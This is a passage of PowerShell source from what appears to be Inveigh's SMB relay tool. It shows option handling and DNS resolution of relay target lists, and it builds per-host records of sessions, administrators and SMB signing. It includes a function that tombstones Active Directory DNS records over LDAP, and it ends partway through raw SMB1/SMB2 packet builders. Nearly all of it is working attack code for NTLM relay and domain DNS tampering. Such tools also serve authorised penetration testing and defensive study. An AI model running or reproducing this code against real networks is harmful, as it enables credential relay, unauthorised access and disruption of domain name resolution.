if($ConsoleOutput -ne 'N')
{
    
    if($ConsoleOutput -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = $ConsoleOutput")  > $null
    }

    $inveigh.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.output_queue.Add("[!] Real Time Console Output Disabled Due To External Tool Selection") > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Real Time Console Output = Disabled") > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $inveigh.console_unique = $true
}
else
{
    $inveigh.console_unique = $false
}

if($FileOutput -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Real Time File Output = Enabled") > $null
    $inveigh.output_queue.Add("[+] Output Directory = $output_directory") > $null
    $inveigh.file_output = $true
}
else
{
    $inveigh.output_queue.Add("[+] Real Time File Output = Disabled") > $null
}

if($FileUnique -eq 'Y')
{
    $inveigh.file_unique = $true
}
else
{
    $inveigh.file_unique = $false
}

if($LogOutput -eq 'Y')
{
    $inveigh.log_output = $true
}
else
{
    $inveigh.log_output = $false
}

if($RunTime -eq 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minute") > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minutes") > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.output_queue.Add("[!] Run Stop-Inveigh to stop") > $null
        
    if($inveigh.console_output)
    {
        $inveigh.output_queue.Add("[*] Press any key to stop console output") > $null
    }

}

while($inveigh.output_queue.Count -gt 0)
{

    switch -Wildcard ($inveigh.output_queue[0])
    {

        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Warning($inveigh.output_queue[0])
            }
            
            if($inveigh.file_output)
            {
                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

        default
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Output($inveigh.output_queue[0])
            }

            if($inveigh.file_output)
            {

                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] "))
                {
                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
                }
                else
                {
                    $inveigh.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

}

if(!$inveigh.netBIOS_domain)
{
    $inveigh.status_output = $false
    $inveigh.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
    $inveigh.computer_name = (Get-ChildItem -path env:computername).Value

    try
    {
        $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
        $inveigh.DNS_computer_name = ($inveigh.computer_name + "." + $inveigh.DNS_domain).ToLower()

        if(!$inveigh.domain_mapping_table.ContainsKey($inveigh.netBIOS_domain))
        {
            $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)
        }

    }
    catch
    {
        $inveigh.DNS_domain = $inveigh.netBIOS_domain
        $inveigh.DNS_computer_name = $inveigh.computer_name
    }

}
else
{

    if(!$inveigh.domain_mapping_table.ContainsKey($inveigh.netBIOS_domain))
    {
        $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)
    }

}

if($inveigh.enumerate)
{
    $inveigh.output_queue.Add("[*] Performing DNS on imported targets") > $null

    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
    {

        if($inveigh.enumerate[$i].Hostname -and !$inveigh.enumerate[$i].IP -and $inveigh.enumerate[$i]."DNS Record" -ne $false)
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.enumerate[$i].Hostname)

                foreach($entry in $IP_list.AddressList)
                {

                    if($entry.AddressFamily -eq 'InterNetwork')
                    {
                        $inveigh.enumerate[$i].IP = $entry.IPAddressToString
                        $inveigh.enumerate[$i]."DNS Record" = $true
                        $inveigh.enumerate[$i]."IPv6 Only" = $false
                        $target_enumerate_keep = $true
                    }

                }

                if(!$target_enumerate_keep)
                {
                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.enumerate[$i].Hostname) not supported") > $null
                    $inveigh.enumerate[$i]."IPv6 Only" = $true
                }

            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.enumerate[$i].Hostname) failed") > $null
                $inveigh.enumerate[$i]."DNS Record" = $false
            }

            $target_enumerate_keep = $false
            $IP_list = $null
        }

    }

    if($DNS_lookup)
    {
        $inveigh.output_queue.Add("[+] DNS lookups complete") > $null
        $DNS_lookup = $false
    }
    else
    {
        $inveigh.output_queue.Add("[+] No DNS lookups required") > $null
    }

}

if($inveigh.target_list)
{
    $inveigh.output_queue.Add("[*] Performing DNS lookups on target list") > $null

    for($i = 0;$i -lt $inveigh.target_list.Count;$i++)
    {

        if(!($inveigh.target_list[$i] -as [IPAddress] -as [Bool]))
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_list[$i])

                foreach($entry in $IP_list.AddressList)
                {

                    if($entry.AddressFamily -eq 'InterNetwork')
                    {
                        $inveigh.target_list[$i] = $entry.IPAddressToString
                        $target_keep = $true
                    }

                    if(!$target_keep)
                    {
                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported") > $null
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list") > $null
                        $inveigh.target_list.RemoveAt($i)
                        $i -= 1
                    }

                }
                        
            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_list[$i]) failed") > $null
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_list[$i]) from target list") > $null
                $inveigh.target_list.RemoveAt($i)
                $i -= 1
            }

            $target_keep = $false
            $IP_list = $null
        }

    }

    if($DNS_lookup)
    {
        $inveigh.output_queue.Add("[+] DNS lookups on complete") > $null
        $DNS_lookup = $false
    }
    else
    {
        $inveigh.output_queue.Add("[+] No DNS lookups required") > $null
    }

}

if($inveigh.target_exclude_list)
{
    $inveigh.output_queue.Add("[*] Performing DNS lookups on excluded targets list") > $null

    for($i = 0;$i -lt $inveigh.target_exclude_list.Count;$i++)
    {

        if(!($inveigh.target_exclude_list[$i] -as [IPAddress] -as [Bool]))
        {
            $DNS_lookup = $true

            try
            {
                $IP_list = [System.Net.Dns]::GetHostEntry($inveigh.target_exclude_list[$i])

                foreach($entry in $IP_list.AddressList)
                {

                    if($entry.AddressFamily -eq 'InterNetwork')
                    {
                        $inveigh.target_exclude_list[$i] = $entry.IPAddressToString
                        $target_exclude_keep = $true
                    }

                }

                if(!$target_exclude_keep)
                {
                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $($inveigh.target_list[$i]) not supported") > $null
                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list") > $null
                    $inveigh.target_exclude_list.RemoveAt($i)
                    $i -= 1
                }

            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $($inveigh.target_exclude_list[$i]) failed") > $null
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Removed $($inveigh.target_exclude_list[$i]) from exclusion list") > $null
                $inveigh.target_exclude_list.RemoveAt($i)
                $i -= 1
            }

            $target_exclude_keep = $false
            $IP_list = $null
        }

    }

    if($DNS_lookup)
    {
        $inveigh.output_queue.Add("[+] DNS lookups complete") > $null
        $DNS_lookup = $false
    }
    else
    {
        $inveigh.output_queue.Add("[+] No DNS lookups required") > $null
    }

}

if($inveigh.target_list -and $inveigh.target_exclude_list)
{
    $inveigh.target_list = Compare-Object -ReferenceObject $inveigh.target_exclude_list -DifferenceObject $inveigh.target_list | Where-Object {$_.sideIndicator -eq "=>"} | ForEach-Object {$_.InputObject}
}

if(!$inveigh.target_list -and !$inveigh.enumerated)
{
    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Disabling relay due empty target list") > $null
    $inveigh.SMB_relay = $false
}

$inveigh.status_output = $false

#endregion
#region begin script blocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function Get-UInt16DataLength
    {
        param ([Int]$Start,[Byte[]]$Data)

        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

        return $data_length
    }

    function Get-UInt32DataLength
    {
        param ([Int]$Start,[Byte[]]$Data)

        $data_length = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)

        return $data_length
    }

    function Convert-DataToString
    {
        param ([Int]$Start,[Int]$Length,[Byte[]]$Data)

        $string_data = [System.BitConverter]::ToString($Data[$Start..($Start + $Length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)

        return $string_extract
    }

    function New-RelayEnumObject
    {
        param ($IP,$Hostname,$DNSDomain,$netBIOSDomain,$Sessions,$AdministratorUsers,$AdministratorGroups,
            $Privileged,$Shares,$NetSessions,$NetSessionsMapped,$LocalUsers,$SMB2,$Signing,$SMBServer,$DNSRecord,
            $IPv6Only,$Targeted,$Enumerate,$Execute)

        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}

        $relay_object = New-Object PSObject
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Record" $DNSRecord
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IPv6 Only" $IPv6Only
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
        
        return $relay_object
    }

    function Invoke-SessionUpdate
    {
        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)

        if($inveigh.domain_mapping_table.$domain)
        {
            $session = ($username + "@" + $inveigh.domain_mapping_table.$domain).ToUpper()
            $hostname_full = ($hostname + "." + $inveigh.domain_mapping_table.$domain).ToUpper()
        }
        else
        {
            $session = $domain + "\" + $username
        }

        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
        {

            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)
            {

                if(!$inveigh.enumerate[$i].Hostname)
                {
                    $inveigh.enumerate[$target_index].Hostname = $hostname_full
                }

                [Array]$session_list = $inveigh.enumerate[$i].Sessions

                if($inveigh.domain_mapping_table.$domain)
                {

                    for($j = 0;$j -lt $session_list.Count;$j++)
                    {

                        if($session_list[$j] -like "$domain\*")
                        {
                            $session_username = ($session_list[$j].Split("\"))[1]
                            $session_update = $session_username + "@" + $inveigh.domain_mapping_table.$domain
                            $session_list[$j] += $session_update
                            $inveigh.enumerate[$i].Sessions = $session_list
                        }

                    }

                }

                if($session_list -notcontains $session)
                {
                    $session_list += $session
                    $inveigh.enumerate[$i].Sessions = $session_list
                }

                $target_updated = $true
                break
            }

        }
     
        if(!$target_updated)
        {
            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null
        }

    }

}

# ADIDNS Functions ScriptBlock
$ADIDNS_functions_scriptblock =
{

    function Disable-ADIDNSNode
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone

        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        $DC_array = $Domain.Split(".")

        foreach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }

        $timestamp = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
        $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))
        $timestamp = $timestamp.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}

        [Byte[]]$DNS_record = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            $SOASerialNumberArray[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            $timestamp

        try
        {
            $directory_entry.InvokeSet('dnsRecord',$DNS_record)
            $directory_entry.InvokeSet('dnsTombstoned',$true)
            $directory_entry.SetInfo()
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        if($directory_entry.Path)
        {
            $directory_entry.Close()
        }

    }

    function New-SOASerialNumberArray
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Zone
        )

        $Zone = $Zone.ToLower()

        function Convert-DataToUInt16($Field)
        {
            [Array]::Reverse($Field)
            return [System.BitConverter]::ToUInt16($Field,0)
        }

        function ConvertFrom-PacketOrderedDictionary($OrderedDictionary)
        {

            foreach($field in $OrderedDictionary.Values)
            {
                $byte_array += $field
            }

            return $byte_array
        }

        function New-RandomByteArray
        {
            param([Int]$Length,[Int]$Minimum=1,[Int]$Maximum=255)

            [String]$random = [String](1..$Length | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum $Minimum -Maximum $Maximum)})
            [Byte[]]$random = $random.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            return $random
        }

        function New-DNSNameArray
        {
            param([String]$Name)

            $character_array = $Name.ToCharArray()
            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}

            if($index_array.Count -gt 0)
            {

                $name_start = 0

                foreach($index in $index_array)
                {
                    $name_end = $index - $name_start
                    [Byte[]]$name_array += $name_end
                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $index + 1
                }

                [Byte[]]$name_array += ($Name.Length - $name_start)
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else
            {
                [Byte[]]$name_array = $Name.Length
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }

            return $name_array
        }

        function New-PacketDNSSOAQuery
        {
            param([String]$Name)

            [Byte[]]$type = 0x00,0x06
            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00
            [Byte[]]$length = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
            [Byte[]]$transaction_ID = New-RandomByteArray 2
            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary
            $DNSQuery.Add("Length",$length)
            $DNSQuery.Add("TransactionID",$transaction_ID)
            $DNSQuery.Add("Flags",[Byte[]](0x01,0x00))
            $DNSQuery.Add("Questions",[Byte[]](0x00,0x01))
            $DNSQuery.Add("AnswerRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AuthorityRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AdditionalRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("Queries_Name",$name)
            $DNSQuery.Add("Queries_Type",$type)
            $DNSQuery.Add("Queries_Class",[Byte[]](0x00,0x01))

            return $DNSQuery
        }

        $DNS_client = New-Object System.Net.Sockets.TCPClient
        $DNS_client.Client.ReceiveTimeout = 3000

        try
        {
            $DNS_client.Connect($DomainController,"53")
            $DNS_client_stream = $DNS_client.GetStream()
            $DNS_client_receive = New-Object System.Byte[] 2048
            $packet_DNSQuery = New-PacketDNSSOAQuery $Zone
            [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery
            $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null
            $DNS_client_stream.Flush()   
            $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null
            $DNS_client.Close()
            $DNS_client_stream.Close()

            if($DNS_client_receive[9] -eq 0)
            {
                $inveigh.output_queue.Add("[-] $Zone SOA record not found") > $null
            }
            else
            {
                $DNS_reply_converted = [System.BitConverter]::ToString($DNS_client_receive)
                $DNS_reply_converted = $DNS_reply_converted -replace "-",""
                $SOA_answer_index = $DNS_reply_converted.IndexOf("C00C00060001")
                $SOA_answer_index = $SOA_answer_index / 2
                $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]
                $SOA_length = Convert-DataToUInt16 $SOA_length
                [Byte[]]$SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]
                $SOA_serial_current = [System.BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + 1
                [Byte[]]$SOA_serial_number_array = [System.BitConverter]::GetBytes($SOA_serial_current)[0..3]
            }

        }
        catch
        {
            $inveigh.output_queue.Add("[-] $DomainController did not respond on TCP port 53") > $null
        }

        return [Byte[]]$SOA_serial_number_array
    }

}

# Packet Functions ScriptBlock
$packet_functions_scriptblock =
{
    function ConvertFrom-PacketOrderedDictionary
    {
        param($OrderedDictionary)

        ForEach($field in $OrderedDictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    function Get-ProcessIDArray
    {
        $process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
        $process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
        [Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        return $process_ID
    }


    #NetBIOS

    function New-PacketNetBIOSSessionService
    {
        param([Int]$HeaderLength,[Int]$DataLength)
    
        [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]
    
        $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
        $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
        $NetBIOSSessionService.Add("Length",$length)
    
        return $NetBIOSSessionService
    }

    #SMB1

    function New-PacketSMBHeader
    {
        param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)
    
        $ProcessID = $ProcessID[0,1]
    
        $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
        $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
        $SMBHeader.Add("Command",$Command)
        $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
        $SMBHeader.Add("Reserved",[Byte[]](0x00))
        $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
        $SMBHeader.Add("Flags",$Flags)
        $SMBHeader.Add("Flags2",$Flags2)
        $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
        $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
        $SMBHeader.Add("TreeID",$TreeID)
        $SMBHeader.Add("ProcessID",$ProcessID)
        $SMBHeader.Add("UserID",$UserID)
        $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))
    
        return $SMBHeader
    }
    function New-PacketSMBNegotiateProtocolRequest
    {
        param([String]$Version)
    
        if($Version -eq 'SMB1')
        {
            [Byte[]]$byte_count = 0x0c,0x00
        }
        else
        {
            [Byte[]]$byte_count = 0x22,0x00  
        }
    
        $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
        $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
    
        if($version -ne 'SMB1')
        {
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
            $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }
    
        return $SMBNegotiateProtocolRequest
    }
    
    #SMB2

    function New-PacketSMB2Header
    {
        param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)
    
        if($Signing)
        {
            $flags = 0x08,0x00,0x00,0x00      
        }
        else
        {
            $flags = 0x00,0x00,0x00,0x00
        }
    
        [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)
    
        if($message_ID.Length -eq 4)
        {
            $message_ID += 0x00,0x00,0x00,0x00
        }
    
        $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
        $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
        $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
        $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2Header.Add("Command",$Command)
        $SMB2Header.Add("CreditRequest",$CreditRequest)
        $SMB2Header.Add("Flags",$flags)
        $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2Header.Add("MessageID",$message_ID)
        $SMB2Header.Add("ProcessID",$ProcessID)
        $SMB2Header.Add("TreeID",$TreeID)
        $SMB2Header.Add("SessionID",$SessionID)
        $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        return $SMB2Header
    }
    
    function New-PacketSMB2NegotiateProtocolRequest
    {
        $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
        $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
        $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
        $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
        $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
        $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))
    
        return $SMB2NegotiateProtocolRequest
    }
    
    function New-PacketSMB2SessionSetupRequest
    {
        param([Byte[]]$SecurityBlob)
    
        [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]
    
        $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
        $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
        $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
        $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
        $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
        $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)
    
        return $SMB2SessionSetupRequest 
    }
    
    function New-PacketSMB2TreeConnectRequest
    {
        param([Byte[]]$Buffer)
    
        [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]
    
        $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
        $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
        $SMB2TreeConnectRequest.Add("PathLength",$path_length)
        $SMB2TreeConnectRequest.Add("Buffer",$Buffer)
    
        return $SMB2TreeConnectRequest
    }
    
    function New-PacketSMB2CreateRequestFile
    {
        param([Byte[]]$NamedPipe)
    
        $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    
        $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
        $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
        $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
        $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
